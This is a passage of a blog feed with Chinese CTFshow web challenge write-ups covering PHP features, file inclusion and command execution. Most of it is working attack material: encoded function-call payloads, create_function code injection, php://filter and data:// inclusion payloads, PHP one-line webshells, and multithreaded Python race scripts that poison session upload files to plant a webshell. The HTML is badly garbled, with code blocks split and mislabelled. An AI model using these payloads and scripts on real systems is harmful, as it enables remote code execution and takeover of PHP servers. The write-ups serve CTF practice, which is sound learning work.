class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- ```php<br>  <span class="hljs-comment"># 取反脚本</span><br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>])^<span class="hljs-number">0xff</span>);<br>  &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;^&quot;</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%ff&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?v1&#x3D;0<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">143</span><br><br>- 类似web<span class="hljs-number">141</span><br><br>- ```<br>  ?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>*(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)(<span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%df</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)*<br></code></pre></td></tr></table></figure></li></ul><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><ul><li><p>这道题对v3进行check，要求v3的长度为1，但没有对v2进行check，所以把命令赋值给v2</p></li><li><p>&#96;&#96;&#96;<br>?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;-(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%00”^”%7f%60%60%20%60%2a”)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">145</span><br><br>- ```<br>  ?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>|(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%df</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span>)|&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><ul><li><pre><code class="hljs">?v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web147</span><br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>          <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>分析正则表达式：<br>&#x2F;i不区分大小写<br>&#x2F;s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]<br>&#x2F;D如果使用$限制结尾字符,则不允许结尾有换行</p></li><li><p>正则的意思是：不能出现以下划线、数字、大小写字母开头并结尾的字符串。很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。</p></li><li><p>所以使用create_function()代码注入，利用\绕过</p></li><li><p>&#96;&#96;&#96;<br>为什么使用\绕过？<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径即在当前的空间内调用； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径即去\这个空间调用。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><br>- ```<br>  get: show=<span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//</span><br>  post: ctf=\create_function<br>   <br>  结果就是：<br>  $ctfshow(<span class="hljs-string">&#x27;&#x27;</span>,$_GET[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>  =&gt;<br>   <br>  \creat_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;echo 123;&#125;system(&#x27;</span>tac f*<span class="hljs-string">&#x27;);//&#x27;</span>);<br>  =&gt;<br>   <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//;&#125;</span><br>   <br>  =&gt;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br>  &#125;<br>  system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><ul><li><p>没有过滤^直接异或构造</p></li><li><p>&#96;&#96;&#96;<br>?code&#x3D;(“%08%02%08%09%05%0d”^”%7b%7b%7b%7d%60%60”)(“%09%01%03%01%06%02”^”%7d%60%60%21%60%28”);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web149</span><br><br>- unlink 删除文件<br><br>- 直接写index里面一句话木马<br><br>- ```<br>  GET:?ctf=index.php<br>  POST:show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>  然后访问url/index.php;POST传参<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /ctfshow_fl0g_here.txt&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web150和150-plus"><a href="#web150和150-plus" class="headerlink" title="web150和150_plus"></a>web150和150_plus</h3><ul><li><p>Session文件包含</p></li><li><p>&#96;&#96;&#96;python</p></li></ul><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><h1 id="Time-20-12-5-13-52"><a href="#Time-20-12-5-13-52" class="headerlink" title="@Time : 20.12.5 13:52"></a>@Time : 20.12.5 13:52</h1><h1 id="author-lonmar"><a href="#author-lonmar" class="headerlink" title="@author:lonmar"></a>@author:lonmar</h1><p>  import io<br>  import requests<br>  import threading</p><p>  sessid &#x3D; ‘test’<br>  data &#x3D; {<br>      “ctf”: “&#x2F;tmp&#x2F;sess_test”,<br>      “cmd”: ‘system(“cat flag.php”);’<br>  }</p><p>  def write(session):<br>      while event.isSet():<br>          f &#x3D; io.BytesIO(b’a’ * 1024 * 50)<br>          resp &#x3D; session.post(‘<a href="http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/&#39;">http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/&#39;</a>,<br>                              data&#x3D;{‘PHP_SESSION_UPLOAD_PROGRESS’: ‘<?php eval($_POST["cmd"]);?>‘},<br>                              files&#x3D;{‘file’: (‘test.txt’, f)}, cookies&#x3D;{‘PHPSESSID’: sessid})</p><p>  def read(session):<br>      while event.isSet():<br>          res &#x3D; session.post(<br>              ‘<a href="http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/?isVIP=1&#39;">http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/?isVIP=1&#39;</a>,<br>              data&#x3D;data<br>          )<br>          if ‘flag{‘ in res.text:<br>              print(res.text)<br>              event.clear()<br>          else:<br>              print(‘[*]retrying…’)</p><p>  if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>      event &#x3D; threading.Event()<br>      event.set()<br>      with requests.session() as session:<br>          for i in range(1, 5):<br>              threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()</p><pre><code class="hljs">      for i in range(1, 5):          threading.Thread(target=read, args=(session,)).start()</code></pre><pre><code class="hljs"></code></pre>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_文件包含</title>
    <link href="/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><ul><li>&#96;&#96;&#96;shell<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web79</span><br><br>- 题目这次过滤了php<br><br>- base64绕过<br><br>- ```shell<br>  /?file=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br>  <br>  PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs====&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><ul><li><p>题目这次过滤了php和data</p></li><li><p>看了hint说利用日志包含</p></li><li><p>payload</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- ```shell<br>  #post传命令<br>  a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><ul><li>过滤了php data  :</li><li>做法同web80</li></ul><h3 id="web82-86"><a href="#web82-86" class="headerlink" title="web82~86"></a>web82~86</h3><ul><li><p>过滤了php data  :  .</p></li><li><p>那么之前的方法不奏效了</p></li><li><p>想到php中我们唯一能控制的无后缀的就是session文件</p></li><li><p>使用session文件包含</p></li><li><pre><code class="shell">#前置知识php5.4之后php.ini开始有几个默认选项1.session.upload_progress.enabled = on#表示浏览器向服务器上传一个文件时,php将会把此次文件上传的详细信息存到session中2.session.upload_progress.cleanup = on#表示文件上传结束后,php会立即清空对应session文件中的内容3.session.upload_progress.prefix = &quot;upload_progress_&quot;#prefix+name表示为session中的健名4.session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5.session.use_strict_mode = off#表示我们对cookie中sessionID可控<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- ```python<br>  import requests<br>  import io<br>  import threading<br>   <br>  <span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span><br>  #设置PHPSESSID的值<br>  <span class="hljs-attribute">sessionid</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>     <br>  data=&#123;<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval(<span class="hljs-variable">$_POST</span>[2]);?&gt;&#x27;);&quot;</span>&#125;<br>   <br>   <br>  #为了进行条件竞争，需要一边写一边读<br>   <br>  #进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马<br>  def write(session):<br>  fileBytes = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*1024</span><span class="hljs-number">*50</span>)          #生产一个50k的文件<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-attribute">response</span>=session.post(url,<br>  data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,<br>  cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,<br>  files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    #设置文件名字和内容<br>  )<br>   <br>   <br>   <br>  #读取session文件，这里文件为/tmp/sess_ctfshow<br>   <br>  def read(session):<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-attribute">response</span>=session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data)<br>  <span class="hljs-attribute">response2</span>=session.get(url+&#x27;tao.php&#x27;);<br>  <span class="hljs-keyword">if</span> response2.<span class="hljs-attribute">status_code</span>==200:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;++++++++++++++++++++&#x27;</span>)<br>  <span class="hljs-keyword">else</span>:<br>  <span class="hljs-built_in">print</span>(response2.status_code)<br>   <br>   <br>   <br>  <span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&#x27;__main__&#x27;:<br>   <br>  #开启多线程进行竞争<br>  <span class="hljs-attribute">evnet</span>=threading.Event()<br>  with requests.session() as session:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(20):<br>  threading.Thread(<span class="hljs-attribute">target</span>=write,args=(session,)).start()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(20):<br>  threading.Thread(<span class="hljs-attribute">target</span>=read,args=(session,)).start()<br>  evnet.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure></code></pre></li><li><p>脚本梭哈,访问url&#x2F;tao.php。post传参2&#x3D;system(‘tac fl0g.php’);</p></li><li><p>什么是多线程竞争</p><ul><li>线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</li><li>数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</li><li>这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</li><li>怎么解决多线程竞争问题?—锁</li><li>锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。</li><li>锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了</li><li>锁的致命问题: 死锁</li></ul></li></ul><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><ul><li><p>&#96;&#96;&#96;shell<br>payload:?file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</p><p>&#x2F;&#x2F;即?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php<br>&#x2F;&#x2F;对写的内容进行base64编码。</p><p>post:content&#x3D;aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B<br>&#x2F;&#x2F;<?php eval($_POST[1]);?><br>&#x2F;&#x2F;这里加上两个a是为两和phpdie组成8个字符进行解码。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"></span><br><span class="language-xml">- 最后访问1.php、post输入system(&#x27;tac fl0g.php&#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">### web88</span><br><span class="language-xml"></span><br><span class="language-xml">- 这题没有过滤data</span><br><span class="language-xml"></span><br><span class="language-xml">- 直接data协议</span><br><span class="language-xml"></span><br><span class="language-xml">- ```shell</span><br><span class="language-xml">  payload：</span><br><span class="language-xml">  ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ21vbmljYSddKTs/Pnh4</span><br><span class="language-xml">  post:monica=system(&#x27;tac f*&#x27;);</span><br><span class="language-xml">   </span><br><span class="language-xml">  //?file=data://text/plain;base64,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;monica&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">xx</span><br><span class="language-xml">  这里在后面添加两个xx是为了不让后面的php代码base64加密之后出现=，有几个=就加几个字符（其实也可以直接将=删除，因为base64在解码的时候会自动删除=）。如果加密后出现出现+就只能换一个php代码。</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><ul><li>没碰过misc</li><li>我跳了</li></ul><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$contents</span>);<br></code></pre></td></tr></table></figure><ul><li><p>和web87类似，只限制了我们过滤器的选择，base64，rot</p></li><li><p>发现<strong>convert.iconv</strong>依旧可以使用。</p></li><li><pre><code class="hljs">convert.iconv.这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  用usc-<span class="hljs-number">2</span>编码<br>  对目标字符串进行<span class="hljs-number">2</span>位一反转；（因为是二位一反转，所以字符的数目保持在偶数位上）<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">payload:get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=2.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;? //ucs大小写都行然后访问2.php post:1=system(&#39;tac f*&#39;);</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_命令执行</title>
    <link href="/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>过滤了字符串‘flag’</p></li><li><pre><code class="hljs">/?c=system(&quot;tac f*.php&quot;);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web30</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span 